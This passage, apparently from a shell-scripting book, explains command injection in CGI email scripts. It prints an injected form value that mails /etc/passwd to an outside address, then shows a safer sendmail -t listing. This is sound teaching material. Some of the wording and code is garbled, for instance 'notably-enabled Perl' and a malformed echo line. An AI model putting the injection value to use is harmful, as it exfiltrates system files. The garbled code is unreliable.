    Listing 8-1: Sending an email to a web form user''s address


    Seems innocent, isn''t it? Now imagine what would happen if, instead of a normal
    email address like taylor@intuitive.com, the user entered-something like this:


    ```

    `sendmail d0od37@das-hak.de < /etc/passwd; echo taylor@intuitive.com`

    ```


    Can you see the danger lurking in that? Rather than sending the short email to
    address, this sends a copy of /etc/passwd file to a delinquent at @das-hak.de,
    perhaps happens to be used as the basis of a determined attack on your system
    security.


    As a result, CGI scripts are written in more security-conscious environments—notably-enabled
    Perl in the shebang (#! at the top of shell scripts) so the script fails if data
    is used from an external source-with being scrubbed or checked.

    But a script''s lack of security features doesn''t preclude its being an equal
    partner in the world of web security. It just means you need to be conscious of
    problems where might creep in and eliminate them. For example, a tiny change in
    Listing 8-1 would prevent hooligans from providing bad external data, as shown
    in Listing 8-2.


    ```

    echo "Subject: Thanks for your signup"

    echo "To: $email ($name)"

    echo"

    echo "Thanks for signing up. You''ll hear from us shortly."

    echo "-- Dave and Brandon"

    ) | sendmail -t

    ```


    Listing 8-2: Sending an email using -t


    The -t flag to sendmail tells the program to scan the message itself for a valid
    destination email address. The backquoted material never sees the light'
